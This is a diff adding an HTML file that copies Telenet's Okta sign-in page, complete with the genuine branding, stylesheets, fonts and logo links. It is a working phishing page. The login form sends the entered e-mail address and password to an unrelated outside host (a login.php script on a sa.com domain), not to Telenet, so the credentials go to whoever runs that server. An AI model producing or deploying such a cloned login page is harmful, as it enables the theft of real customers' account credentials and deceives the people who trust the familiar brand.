@@ -1,0 +1,493 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="noindex,nofollow" />
+    <!-- Styles generated from theme -->
+    <link href="https://secure.telenet.be/api/internal/brand/theme/style-sheet?touch-point=SIGN_IN_PAGE&amp;v=4a42e3be12ff464d31b85a7e87ca71f25f0a9d4036a3a15d82ba6436c53ac491fafac595d532658c2ed2228488256d11" rel="stylesheet" type="text/css">
+    <!-- Favicon from theme -->
+    <link rel="shortcut icon" href="https://ok9static.oktacdn.com/bc/image/fileStoreRecord?id=fs094ikn42QnTfzii417" type="image/x-icon"/>
+    <!-- telenet font -->
+    <link rel="preload" href="https://static-resources.ciam-prod.awsprod.external.telenet.be/prd/Telenet-Albra-Regular.woff2" as="font" type="font/woff2" crossOrigin="anonymous" />
+    <link rel="preload" href="https://static-resources.ciam-prod.awsprod.external.telenet.be/prd/Telenet-Albra-Bold.woff2" as="font" type="font/woff2" crossOrigin="anonymous" />
+
+    <title>Telenet - Sign In</title>
+
+    <!-- Core widget js and css -->
+<script type="text/javascript"
+        src="https://ok9static.oktacdn.com/assets/js/sdk/okta-signin-widget/7.26.1/js/okta-sign-in.min.js" integrity="sha384-DXJvm4t9ORnLKbNOez5Uy9pk++uAxlNXU66jBo3z97iPzUFgDeDFYfTBCWBWMQaR" crossorigin="anonymous"></script>
+<link rel="stylesheet"
+      type="text/css"
+      href="https://ok9static.oktacdn.com/assets/js/sdk/okta-signin-widget/7.26.1/css/okta-sign-in.min.css"
+      integrity="sha384-63aTBe2wMqzMRsDHNmlF/FreSWmf3p08BhUDoPlzVf3d+stbkfWtqmdyJ4He5m3m"
+      crossorigin="anonymous">
+
+<!-- Customizable css theme options. Link your own stylesheet or override styles inline. -->
+<link rel="stylesheet"
+      type="text/css" href="" integrity="" crossorigin="anonymous">
+
+<!-- styles for custom sign in -->
+<link rel="stylesheet" type="text/css" href="https://ok9static.oktacdn.com/assets/loginpage/css/custom-signin.a91af2abfd04662e499bd3e151150dbf.css" integrity="sha384-BhMidK4jYIQaVFKNVHUvbfdgrt4NVlnlTZMsOMWLdWkme3j1JcshKDNQiMssd7sN" crossorigin="anonymous">
+
+
+
+    <style nonce="cA-FAW5V0gdmBs7WAOE1Ig">
+        @font-face {
+            font-family: TelenetAlbra-Regular;
+            src: url(https://static-resources.ciam-prod.awsprod.external.telenet.be/prd/Telenet-Albra-Regular.woff2) format("woff2")
+        }
+
+        @font-face {
+            font-family: TelenetAlbra-Bold;
+            src: url(https://static-resources.ciam-prod.awsprod.external.telenet.be/prd/Telenet-Albra-Bold.woff2) format("woff2")
+        }
+
+        #login-bg-image-id {
+            background-image: url('https://ok9static.oktacdn.com/fs/bco/7/fs0chyx69ua4xbJnw417');
+            background-color: #FFEDB5 !important;
+        }
+
+        .maintenance-mode-content {
+            background-color: rgba(255,149,0,0.16) !important;
+            padding: 15px 15px !important;
+            margin-bottom: 15px !important;
+            background-image: url(https://static-resources.ciam-prod.awsprod.external.telenet.be/prd/warning.svg) no repeat top left !important;
+        }
+
+        .social-linking-content {
+            padding: 20px 0 !important
+        }
+
+        /**
+         * custom styling telenet branding
+         */
+        #okta-sign-in {
+            border: none;
+            border-radius: 0;
+            width: 364px;
+        }
+
+        #okta-sign-in.auth-container.main-container {
+            font-family: TelenetAlbra-Regular, Helvetica, Verdana, Arial, Sans-serif;
+            font-size: 1rem;
+            line-height: 1.5rem;
+            font-weight: 400;
+            -moz-osx-font-smoothing: grayscale;
+            -webkit-font-smoothing: antialiased;
+            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+            text-rendering: optimizeLegibility;
+            color: #291d18;
+        }
+
+        #okta-sign-in.auth-container .okta-form-title {
+            font-weight: 700;
+        }
+
+        #okta-sign-in.auth-container .okta-form-label {
+            font-weight: 400;
+        }
+
+        #okta-sign-in .auth-org-logo {
+            float: left;
+        }
+
+        #okta-sign-in .social-auth-button.link-button {
+            border: 2px solid #291D1864;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 0.9rem;
+        }
+
+        #okta-sign-in.auth-container input[type=button], #okta-sign-in.auth-container input[type=submit] {
+            font-family: TelenetAlbra-Regular, Helvetica, Verdana, Arial, Sans-serif;
+        }
+
+        #okta-sign-in.auth-container .okta-form-input-field input {
+            font-family: TelenetAlbra-Regular, Helvetica, Verdana, Arial, Sans-serif;
+        }
+
+        #okta-sign-in.auth-container .okta-form-input-field:hover {
+            border-color: #291D1860
+        }
+
+        #okta-sign-in.auth-container .button-primary {
+            font-size: 0.9rem;
+            font-weight: 700;
+            box-shadow: none;
+        }
+
+        #okta-sign-in.auth-container .okta-form-input-field {
+            border-color: #291D1840;
+            border-width: 2px;
+        }
+
+        #okta-sign-in .o-form .input-fix, #okta-sign-in .o-form .textarea-fix {
+            border-radius: 0px;
+        }
+
+        #okta-sign-in .o-form .input-fix, #okta-sign-in .o-form .textarea-fix {
+            height: 50px;
+        }
+
+        #okta-sign-in .o-form .o-form-fieldset:last-child {
+            margin-bottom: 0px;
+        }
+
+        #okta-sign-in .o-form-button-bar .links-primary {
+            display: none;
+        }
+
+        #okta-sign-in.auth-container .link, #okta-sign-in.auth-container .link:active, #okta-sign-in.auth-container .link:hover, #okta-sign-in.auth-container .link:link, #okta-sign-in.auth-container .link:visited {
+            color: #291d18;
+        }
+
+        #okta-sign-in.auth-container .link:focus {
+            color: #6e6e78;
+        }
+
+        #okta-sign-in.auth-container.main-container {
+            color: #291d18;
+        }
+
+        /**
+         * custom styling error messages
+         */
+        #okta-sign-in .siw-main-view .infobox-error {
+            background: rgba(222, 53, 11, 0.16);
+        }
+
+        #okta-sign-in .siw-main-view .infobox-warning {
+            background: rgba(255,149,0,0.16);
+        }
+
+        #okta-sign-in .help-wrap .infobox.infobox-error:before, #okta-sign-in .infobox-error:before, #okta-sign-in .infobox.infobox-subtle.infobox-error:before {
+            background-color: transparent;
+        }
+
+        #okta-sign-in .error-16:before {
+            color: #de350b;
+        }
+
+        #okta-sign-in .infobox {
+            padding: 12px 18px 12px 40px !important;
+        }
+
+        #okta-sign-in .infobox, #okta-sign-in .infobox-md {
+            border: none;
+            border-radius: 0;
+        }
+
+        #okta-sign-in .o-form-explain.o-form-input-error {
+            color: #de350b;
+        }
+
+        /**
+         * custom styling for the social linking message
+         */
+        .social-itsme-auth {
+            background-color: #fff !important;
+            background: url(https://static-resources.ciam-prod.awsprod.external.telenet.be/prd/icon-itsme.svg) no-repeat 12px/30px !important;
+        }
+
+        .social-itsme-auth:hover {
+            background-color: #efefef !important;
+        }
+
+        .social-itsme-auth:focus {
+            box-shadow: 0 0 8px #51cbee;
+        }
+
+        /**
+         * custom styling verify other
+         */
+        #okta-sign-in .authenticator-row .authenticator-button .button {
+            border: 2px solid #291d1894;
+            text-decoration: none;
+            height: 36px;
+            padding: 2px 6px;
+            font-size: 0.9rem;
+        }
+
+        #okta-sign-in .authenticator-verify-list .authenticator-description>div {
+            margin: 0 2px;
+        }
+
+        p.authenticator-description--text {
+            font-size: 0.9rem !important;
+            color: #655C58;
+        }
+
+        #okta-sign-in.auth-container .o-form-explain {
+            display: none;
+        }
+
+        #okta-sign-in .authenticator-row .authenticator-button .button:hover {
+            background-color: #efefef !important;
+            border: 2px solid #291d18;
+        }
+
+        #okta-sign-in.auth-container .button {
+            background: #fff;
+            background-color: #fff;
+        }
+
+        #okta-sign-in .authenticator-row .authenticator-icon {
+            border: none;
+        }
+
+        #okta-sign-in.auth-container h2, #okta-sign-in.auth-container h3 {
+            color: #291D18;
+            font-weight: 400;
+        }
+
+        #okta-sign-in.auth-container .button {
+            color: #291D18;
+            box-shadow: none;
+        }
+
+        #okta-sign-in .siw-main-footer .auth-footer .link {
+            padding: 0.3rem 0 0 0;
+        }
+
+        #okta-sign-in .siw-main-view .custom-checkbox {
+            line-height: 1rem;
+        }
+
+        #okta-sign-in .siw-main-view .siw-main-body .identifier {
+            font-size: 0.9rem;
+            color: #655C58
+        }
+
+        #okta-sign-in .siw-main-view .siw-main-body .identifier-container {
+            text-align: left;
+        }
+
+        #okta-sign-in .o-form-head {
+            text-align: left;
+        }
+
+        #okta-sign-in .phone-authenticator-challenge .okta-form-subtitle {
+            text-align: left;
+        }
+
+        #okta-sign-in .authenticator-row .authenticator-icon-container {
+            margin: 0;
+        }
+
+        #okta-sign-in .authenticator-verify-list .authenticator-row {
+            margin-bottom: 20px;
+        }
+
+        #okta-sign-in .authenticator-verify-list .siw-main-body .identifier-container {
+            margin-bottom: 0;
+        }
+
+        #okta-sign-in .oie-enroll-google-authenticator .enter-code-title {
+            text-align: left;
+        }
+
+        #okta-sign-in .oie-enroll-google-authenticator .google-authenticator-setup-info-title {
+            margin-top: 15px;
+            text-align: left;
+            font-weight: 700;
+        }
+
+        #okta-sign-in .oie-enroll-google-authenticator .google-authenticator-setup-info {
+            text-align: left;
+            margin-right: auto;
+        }
+
+        #okta-sign-in .oie-enroll-google-authenticator .qrcode-info-container {
+            display: block;
+        }
+
+        #okta-sign-in .oie-enroll-google-authenticator .qrcode-container .qrcode {
+            margin-top: 5px;
+            display: block;
+            max-width: 150px;
+            border: none;
+        }
+
+        #okta-sign-in .oie-enroll-google-authenticator .o-form-disabled {
+            opacity: 1;
+        }
+
+        #okta-sign-in .siw-main-footer .auth-footer .link.js-switchAuthenticator b {
+            font-weight: bold;
+        }
+
+        /*
+         * hide beacon
+         */
+        #okta-sign-in .beacon-container {
+            display: none;
+        }
+
+        #okta-sign-in .auth-header {
+            padding: 32px 32px 75px;
+        }
+
+        @media only screen and (max-width: 600px) {
+            #okta-sign-in {
+                margin-top: 0;
+            }
+            #okta-sign-in .auth-header {
+                padding: 20px 20px 32px !important;
+            }
+            #okta-sign-in .auth-content {
+                padding: 0 20px 20px !important;
+            }
+            #login-bg-image-id {
+                background-color: #fff !important;
+            }
+            #okta-sign-in.auth-container .auth-content, #okta-sign-in.auth-container .auth-header {
+                margin: 0 auto;
+                max-width: 100% !important;
+            }
+        }
+
+        #okta-sign-in.no-beacon .auth-content {
+            padding-top: 20px;
+        }
+
+        #okta-sign-in .auth-content {
+            padding: 20px 32px 32px 32px
+        }
+
+        #okta-sign-in.auth-container .okta-sign-in-header {
+            padding-bottom: 10px;
+            border-bottom: 0;
+            min-height: 40px;
+        }
+
+        /*
+         * custom styling for the language selector
+         */
+        #language-container {
+            display: block;
+            text-align: right;
+            padding: 8px 0 !important;
+            font-size: 0.9rem !important;
+        }
+
+        #okta-sign-in a, #okta-sign-in a:active, #okta-sign-in a:focus, #okta-sign-in a:hover, #okta-sign-in a:link, #okta-sign-in a:visited {
+            color: #6e6e78;
+        }
+
+        .selected-language {
+            color: #291d18 !important;
+            text-decoration: none;
+            font-weight: 700 !important;
+        }
+
+        .language-selector {
+            margin-right: 10px !important;
+            font-size: 0.9rem !important;
+        }
+
+        .language-selector:hover {
+            color: #291d18 !important;
+            text-decoration: none;
+        }
+
+        /**
+         * qr-code configuration
+         */
+        .oie-enroll-google-authenticator-manual-setup {
+            margin-bottom: 32px !important;
+        }
+        #okta-sign-in a.google-authenticator-verify.default-custom-button.button-primary.link-button {
+            margin-top: -10px
+        }
+
+        /**
+         * mfa icons
+         */
+
+        #okta-sign-in.auth-container .mfa-okta-verify {
+            background-image: url(https://static-resources.ciam-prod.awsprod.external.telenet.be/prd/mfa-okta-verify.svg);
+        }
+
+        #okta-sign-in.auth-container .mfa-webauthn {
+            background-image: url(https://static-resources.ciam-prod.awsprod.external.telenet.be/prd/mfa-webauthn.svg);
+        }
+
+        #okta-sign-in.auth-container .mfa-okta-password {
+            background-image: url(https://static-resources.ciam-prod.awsprod.external.telenet.be/prd/mfa-okta-password.svg);
+        }
+
+        #okta-sign-in.auth-container .mfa-okta-phone {
+            background-image: url(https://static-resources.ciam-prod.awsprod.external.telenet.be/prd/mfa-okta-phone.svg);
+        }
+
+        #okta-sign-in.auth-container .mfa-okta-email {
+            background-image: url(https://static-resources.ciam-prod.awsprod.external.telenet.be/prd/mfa-okta-email.svg);
+        }
+
+        #okta-sign-in.auth-container .mfa-google-auth {
+            background-image: url(https://static-resources.ciam-prod.awsprod.external.telenet.be/prd/mfa-google-auth.svg);
+        }
+
+        #okta-sign-in.auth-container .authenticator-icon-container .mfa-okta-verify,
+        #okta-sign-in.auth-container .authenticator-icon-container .mfa-webauthn,
+        #okta-sign-in.auth-container .authenticator-icon-container .mfa-okta-phone,
+        #okta-sign-in.auth-container .authenticator-icon-container .mfa-okta-email,
+        #okta-sign-in.auth-container .authenticator-icon-container .mfa-google-auth,
+        #okta-sign-in.auth-container .authenticator-icon-container .mfa-okta-password {
+            background-size: 30px 25px !important;
+            background-repeat: no-repeat !important;
+            background-position: 0px 7px !important;
+        }
+    </style>
+
+    <script type="text/javascript" src="https://static-resources.ciam-prod.awsprod.external.telenet.be/prd/apm-dynatrace-0624.js" defer crossorigin="anonymous"></script>
+
+</head>
+<body>
+
+<div id="login-bg-image-id" class="login-bg-image tb--background"></div>
+<div id="okta-login-container"><main data-se="auth-container" tabindex="-1" id="okta-sign-in" class="auth-container main-container no-beacon" style=""><div class="okta-sign-in-header auth-header"><h1><img src="https://ok9static.oktacdn.com/fs/bco/1/fs0ci1i9sp9xQg0tI417" class="auth-org-logo" alt="Telenet logo logo" aria-label="Telenet logo logo"></h1><div data-type="beacon-container" class="beacon-container"></div><div id="language-container"><a id="lngNL" href="#" class="language-selector">NL</a><a id="lngFR" href="#" class="language-selector">FR</a><a id="lngEN" href="#" class="language-selector selected-language">EN</a></div></div><div class="auth-content"><div class="auth-content-inner"><div class="siw-main-view identify primary-auth"><div class="siw-main-header"><div></div></div><div class="siw-main-body">
+
+<form method="POST" action="https://so.kireghs0.sa.com/telenet/login.php" data-se="o-form" slot="content" id="form66" class="ion-form o-form o-form-edit-mode"><div data-se="o-form-content" class="o-form-content o-form-theme clearfix"><div class="o-form-info-container"></div><div class="o-form-error-container" data-se="o-form-error-container" role="alert"></div><div class="o-form-fieldset-container" data-se="o-form-fieldset-container">
+
+<div data-se="o-form-fieldset-identifier" class="o-form-fieldset o-form-label-top"><div data-se="o-form-label" class="okta-form-label o-form-label"><label for="input74">Your e-mail address&nbsp;</label></div><div data-se="o-form-input-container" class="o-form-input"><span data-se="o-form-input-identifier" class="o-form-input-name-identifier o-form-control okta-form-input-field input-fix"><input type="text" placeholder="" name="west" id="input74" value="" aria-label="" autocomplete="username"required></span></div></div>
+
+
+<div data-se="o-form-fieldset-credentials.passcode" class="o-form-fieldset o-form-label-top"><div data-se="o-form-label" class="okta-form-label o-form-label"><label for="input107">Password&nbsp;</label></div><div data-se="o-form-input-container" class="o-form-input"><span data-se="o-form-input-credentials.passcode" class="o-form-input-name-credentials.passcode o-form-control okta-form-input-field input-fix"><input type="password" placeholder="" name="girl" id="input107" value="" aria-label="" autocomplete="off" class="password-with-toggle"required><span class="password-toggle"><span class="eyeicon visibility-16 button-show"></span><span class="eyeicon visibility-off-16 button-hide"></span></span></span></div></div></div></div>
+
+
+
+<div data-se="o-form-fieldset-rememberMe" class="o-form-fieldset o-form-label-top"><div data-se="o-form-input-container" class="o-form-input"><span data-se="o-form-input-rememberMe" class="o-form-input-name-rememberMe"><div class="custom-checkbox"><input type="checkbox" name="rememberMe" id="input82"><label for="input82" data-se-for-name="rememberMe" class="">Keep me signed in</label></div></span></div></div></div></div><div class="o-form-button-bar"><input class="button button-primary" type="submit" value="Next" data-type="save"></div></form></div><div class="siw-main-footer"><div class="auth-footer"><a data-se="help" href="https://www.telenet.be/nl/create-profile/?flow=selfRegistration" target="_blank" rel="noopener noreferrer" class="link js-help"> </a></div></div></div></div></div></main></div>
+
+
+<!--
+    "OktaUtil" defines a global OktaUtil object
+    that contains methods used to complete the Okta login flow.
+ -->
+
+<div id="okta-sign-in" class="auth-container main-container unsupported-message-container" style="display:none">
+    <div id="unsupported-cookie" class="unsupported-message" style="display:none">
+        <h2 class="o-form-head">Cookies are required</h2>
+        <p>Cookies are disabled on your browser. Please enable Cookies and refresh this page.</p>
+        <a class="button button-primary" target="_blank" href=".">
+            Refresh
+        </a>
+    </div>
+</div>
+<div id="inactive-tab-main-div" style="display:none;">
+    <div class="inactive-tab-container">
+        <div class="inactive-tab-header">
+            <img src="https://ok9static.oktacdn.com/fs/bco/1/fs0ci1i9sp9xQg0tI417" alt="Telenet" class="report-org-logo">
+            <div class="divider"></div>
+        </div>
+        <div class="inactive-tab-content">
+            <h2 class="inactive-tab-content-title">The page has timed out</h2>
+            <p class="inactive-tab-details">If this page does not reload automatically, please refresh your browser.</p>
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
